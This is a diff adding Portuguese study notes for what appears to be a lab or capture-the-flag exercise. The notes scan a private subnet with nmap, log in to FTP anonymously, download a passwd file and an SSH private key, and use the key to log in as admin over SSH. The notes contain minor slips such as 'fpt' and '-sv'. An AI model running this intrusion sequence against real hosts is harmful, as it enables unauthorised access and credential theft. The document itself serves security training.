@@ -309,3 +309,65 @@ apt install nmap
 
 nmap 10.20.20.0/24 -sn
 
+// achados:
+10.20.20.156
+
+// agora fazemos as portas abertas
+
+nmap 10.20.20.156
+
+// achados:
+
+porta 21 e 22 - fpt e ssh
+
+// vendo as versões
+
+nmap 10.20.20.156 -sv
+
+// achados:
+
+vsftpd 3.0.3 -> coloca no searchsploit
+
+### Conectando com o ftp
+
+apt install ftp
+
+ftp 10.20.20.156
+
+// alguns servidores utilizam entrada anonima
+
+usuário: anonymous
+senha: 
+(sem senha)
+
+// agora vamos ver os arquivos
+
+ls
+
+// baixa os arquivos com
+
+get passwd
+
+cd .ssh
+
+get id_rsa
+
+// agora vamos ver o arquivo
+
+cat passwd
+
+// achamos o usuário admin
+
+cat id_rsa
+
+// é uma chave que temos acesso com ssh
+
+### Conectando com o ssh
+
+// Primeiro mudar as permissões
+
+chmod 600 id_rsa
+
+// agora vamos conectar
+
+ssh admin@10.20.20.156 -i id_rsa
